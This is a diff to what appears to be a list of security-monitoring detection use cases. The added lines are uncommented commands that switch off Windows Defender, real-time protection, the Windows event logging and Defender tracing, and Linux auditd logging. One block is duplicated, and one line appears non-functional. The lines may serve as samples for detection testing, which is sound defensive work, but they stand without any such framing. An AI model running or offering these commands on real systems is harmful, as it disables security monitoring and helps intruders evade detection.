@@ -488,3 +488,21 @@ Malicious browsing  to C2
 Malicious or suspicious browsing from VSP without referer
 Virus not removed on workstation
 
+
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Application" /v "Enabled" /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f
+Set-MpPreference -DisableRealtimeMonitoring $true
+logman update trace -n "Microsoft-Windows-Windows Defender/Operational" -enabled false
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1
+[System.Diagnostics.Eventing.EventProvider]::new([Guid]::NewGuid()).Dispose()
+
+
+echo "max_log_file_action = ignore" >> /etc/audit/auditd.conf
+systemctl restart auditd
+
+echo "q_depth = 1" >> /etc/audisp/audispd.conf
+systemctl restart auditd
+
+echo "q_depth = 1" >> /etc/audisp/audispd.conf
+systemctl restart auditd
+
